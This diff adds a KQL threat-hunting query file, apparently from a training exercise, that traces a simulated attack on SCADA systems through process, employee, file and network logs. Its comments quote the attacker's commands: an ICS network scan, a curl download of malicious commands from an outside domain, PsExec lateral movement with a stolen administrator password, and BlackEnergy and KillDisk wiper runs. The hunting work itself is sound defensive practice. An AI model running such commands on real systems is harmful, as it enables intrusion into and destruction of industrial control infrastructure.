@@ -1,0 +1,29 @@
+// Phase 1 - Start at the impact: what ran against the SCADA systems?
+// Tables: ProcessEvents, Employees
+
+// Any SCADA-related command lines?  -> 5 commands on BDC0-DESKTOP (user jisaetang)
+ProcessEvents
+| where process_commandline has "SCADA"
+| project timestamp, hostname, username, parent_process_name, process_commandline
+| order by timestamp asc
+
+// Whose workstation is it?  -> Jibby Saetang, SCADA Operator, 10.10.0.8
+Employees
+| where hostname == "BDC0-DESKTOP"
+
+// Key commands found:
+//  2024-09-09 11:17:44  ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt
+//  2024-09-10 03:43:57  curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt
+//  PsExec loops over SCADA_IPs.txt as "administrator" (password from C:\ProgramData\Extracted_Password.txt):
+//    copy BlackEnergy.exe -> run BlackEnergy + malicious commands -> KillDisk.exe --all --wipe
+
+// Where did the scanner come from?
+FileCreationEvents
+| where hostname == "BDC0-DESKTOP"
+| where filename == "ICSScanner.exe"
+| project timestamp, path, sha256, process_name
+
+OutboundNetworkEvents
+| where src_ip == "10.10.0.8"
+| where url contains "ICSScanner"
+| project timestamp, url
